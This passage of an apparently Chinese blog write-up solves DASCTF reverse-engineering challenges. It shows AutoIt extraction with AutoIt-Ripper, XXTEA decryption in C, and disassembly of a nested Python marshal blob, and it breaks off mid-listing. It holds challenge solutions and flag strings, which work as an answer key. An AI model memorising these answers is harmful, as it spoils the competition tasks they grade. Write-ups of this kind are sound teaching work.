class="number">0</span>):</span><br><span class="line">        x = [<span class="built_in">abs</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> line[:-<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(x).issubset([<span class="number">0</span>, <span class="number">1</span>]):</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">            flag = <span class="string">&#x27;DASCTF&#123;&#x27;</span>+sha256(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> x]).encode()).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/03/YjdHfbD6wquvmnB.png" alt="image.png"></p>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="auuuu3"><a href="#auuuu3" class="headerlink" title="auuuu3"></a>auuuu3</h2><p>给的是一个autoit格式的exe<br>如果用IDA查看 基本上是做不出来的<br>万幸的是有个脚本可以帮我们extract<br><a href="https://github.com/nazywam/AutoIt-Ripper">https://github.com/nazywam/AutoIt-Ripper</a><br>然后这么用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> autoit_ripper <span class="keyword">import</span> extract, AutoItVersion</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\浏览器下载\auuuu3.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_content = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># EA05 for v3.00+, EA06 for v3.26+</span></span><br><span class="line"><span class="comment"># Omitting `version` or passing None will try both versions</span></span><br><span class="line">content_list = extract(data=file_content, version=AutoItVersion.EA06)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;D:\浏览器下载\auuuu3.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">        s = <span class="built_in">str</span>(content)</span><br><span class="line">        f.write(s)</span><br></pre></td></tr></table></figure>
<p>WP用的exe我没找到… 但是这样提取出来大致也能看<br>很容易定位到最后一部分<br><img src="https://s2.loli.net/2023/12/03/GAH385FJgWbe4xw.png" alt="image-1.png"><br>这里相当于load了一个dll 只是是用hex写的 我们将这段opcode导入dll用IDA来分析</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">OPCODE = <span class="string">&quotquot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\浏览器下载\enc.dll&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(binascii.unhexlify(OPCODE))</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/03/o6lqvjngdYhQsIW.png" alt="ZZ_QD_HMMKFJ94TSU_~VHPT.png"><br>标准的xxtea加密</p>
<p>我们已知 ciphertext<code>7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675</code></p>
<p>key<code>Wowww111auUu3</code><br>小端序转一下 解密</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">10</span>]= &#123;<span class="number">0x1A181872</span>,<span class="number">0x4B9FF702</span>,<span class="number">0xFFE87357</span>,<span class="number">0x32E73FE8</span>,<span class="number">0x9F2596DF</span>,<span class="number">0xAB6AB8F2</span>,<span class="number">0xA1685494</span>,<span class="number">0x833DA832</span>,<span class="number">0x0E759DCF</span>,<span class="number">0x75866C31</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x77776f57</span>,<span class="number">0x31313177</span>,<span class="number">0x75557561</span>,<span class="number">0x33</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">10</span>; </span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">    		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(v[i]&gt;&gt;(<span class="number">8</span>*j))&amp;<span class="number">0xff</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>flag : <strong>DASCTF{Oh1_autO1t_iS_so_Co0oL_aNd_Fun}</strong><br>可以看到 这题主要考的其实是合理利用工具进行分析(找到autoit-ripper后的分析其实并不难 <del>但如果只会IDA就G了…</del>)</p>
<h2 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a>marshal</h2><p>题目给的一个嵌套marshal的py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span></span><br><span class="line"></span><br><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="built_in">exec</span>(l)</span><br></pre></td></tr></table></figure>
<p>直接执行是会报错的 拿到这种还是先用dis.dis查看下字节码(本地跑还一直报错 用在线python跑就行了)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line">dis.dis(l)</span><br></pre></td></tr></table></figure>
<p>可以发现里面还嵌了marshal</p>
<details>
<summary>点击查看代码</summary>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  3           0 LOAD_CONST               0 (12)</span><br><span class="line">              2 LOAD_CONST               1 (5)</span><br><span class="line">              4 LOAD_CONST               2 (6)</span><br><span class="line">              6 LOAD_CONST               3 (11)</span><br><span class="line">              8 LOAD_CONST               4 (9)</span><br><span class="line">             10 LOAD_CONST               5 (0)</span><br><span class="line">             12 LOAD_CONST               6 (10)</span><br><span class="line">             14 LOAD_CONST               7 (13)</span><br><span class="line">             16 LOAD_CONST               8 (3)</span><br><span class="line">             18 LOAD_CONST               9 (14)</span><br><span class="line">             20 LOAD_CONST              10 (15)</span><br><span class="line">             22 LOAD_CONST              11 (8)</span><br><span class="line">             24 LOAD_CONST              12 (4)</span><br><span class="line">             26 LOAD_CONST              13 (7)</span><br><span class="line">             28 LOAD_CONST              14 (1)</span><br><span class="line">             30 LOAD_CONST              15 (2)</span><br><span class="line">             32 BUILD_LIST              16</span><br><span class="line">             34 STORE_NAME               0 (Sbox)</span><br><span class="line"></span><br><span class="line">  4          36 LOAD_CONST              16 (&lt;code object &lt;listcomp&gt; at 0x7fbf6f8f83a0, file &quot;&quot;, line 4&gt;)</span><br><span class="line">             38 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">             40 MAKE_FUNCTION            0</span><br><span class="line">             42 LOAD_NAME                1 (range)</span><br><span class="line">             44 LOAD_CONST              18 (16)</span><br><span class="line">             46 CALL_FUNCTION            1</span><br><span class="line">             48 GET_ITER</span><br><span class="line">             50 CALL_FUNCTION            1</span><br><span class="line">             52 STORE_NAME               2 (Sbox_inv)</span><br><span class="line"></span><br><span class="line">  5          54 LOAD_CONST               5 (0)</span><br><span class="line">             56 LOAD_CONST              18 (16)</span><br><span class="line">             58 LOAD_CONST              19 (32)</span><br><span class="line">             60 LOAD_CONST              20 (48)</span><br><span class="line">             62 LOAD_CONST              14 (1)</span><br><span class="line">             64 LOAD_CONST              21 (17)</span><br><span class="line">             66 LOAD_CONST              22 (33)</span><br><span class="line">             68 LOAD_CONST              23 (49)</span><br><span class="line">             70 LOAD_CONST              15 (2)</span><br><span class="line">             72 LOAD_CONST              24 (18)</span><br><span class="line">             74 LOAD_CONST              25 (34)</span><br><span class="line">             76 LOAD_CONST              26 (50)</span><br><span class="line">             78 LOAD_CONST               8 (3)</span><br><span class="line">             80 LOAD_CONST              27 (19)</span><br><span class="line">             82 LOAD_CONST              28 (35)</span><br><span class="line">             84 LOAD_CONST              29 (51)</span><br><span class="line"></span><br><span class="line">  6          86 LOAD_CONST              12 (4)</span><br><span class="line">             88 LOAD_CONST              30 (20)</span><br><span class="line">             90 LOAD_CONST              31 (36)</span><br><span class="line">             92 LOAD_CONST              32 (52)</span><br><span class="line">             94 LOAD_CONST               1 (5)</span><br><span class="line">             96 LOAD_CONST              33 (21)</span><br><span class="line">             98 LOAD_CONST              34 (37)</span><br><span class="line">            100 LOAD_CONST              35 (53)</span><br><span class="line">            102 LOAD_CONST               2 (6)</span><br><span class="line">            104 LOAD_CONST              36 (22)</span><br><span class="line">            106 LOAD_CONST              37 (38)</span><br><span class="line">            108 LOAD_CONST              38 (54)</span><br><span class="line">            110 LOAD_CONST              13 (7)</span><br><span class="line">            112 LOAD_CONST              39 (23)</span><br><span class="line">            114 LOAD_CONST              40 (39)</span><br><span class="line">            116 LOAD_CONST              41 (55)</span><br><span class="line"></span><br><span class="line">  7         118 LOAD_CONST              11 (8)</span><br><span class="line">            120 LOAD_CONST              42 (24)</span><br><span class="line">            122 LOAD_CONST              43 (40)</span><br><span class="line">            124 LOAD_CONST              44 (56)</span><br><span class="line">            126 LOAD_CONST               4 (9)</span><br><span class="line">            128 LOAD_CONST              45 (25)</span><br><span class="line">            130 LOAD_CONST              46 (41)</span><br><span class="line">            132 LOAD_CONST              47 (57)</span><br><span class="line">            134 LOAD_CONST               6 (10)</span><br><span class="line">            136 LOAD_CONST              48 (26)</span><br><span class="line">            138 LOAD_CONST              49 (42)</span><br><span class="line">            140 LOAD_CONST              50 (58)</span><br><span class="line">            142 LOAD_CONST               3 (11)</span><br><span class="line">            144 LOAD_CONST              51 (27)</span><br><span class="line">            146 LOAD_CONST              52 